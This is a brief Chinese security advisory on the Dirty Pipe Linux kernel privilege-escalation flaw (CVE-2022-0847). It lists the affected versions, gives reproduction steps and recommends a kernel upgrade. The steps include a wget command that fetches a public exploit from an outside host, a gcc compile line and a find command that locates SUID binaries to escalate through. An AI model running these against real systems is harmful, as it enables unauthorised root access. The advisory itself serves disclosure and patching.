01

风险说明



   CVE-2022-0847是Linux kernel中的一个漏洞，它允许覆盖任意只读文件中的数据，从而达到低权限提升为root权限


02

影响版本




   5.8 < Linux kernel < 5.16.11、5.15.25 、5.10.102


03

漏洞复现




POC下载：

wget https://haxx.in/files/dirtypipez.c ##下载pocgcc dirtypipez.c -o dirtypipez ## gcc编译

使用kali环境进行演示：

使用下载的POC进行gcc编译：

该POC需要一个带有suid权限的执行文件进行提权：

find / -perm -u=s -type f 2>/dev/null



04

修复建议




Linux kernel 升级到 5.16.11、5.15.25 和 5.10.102
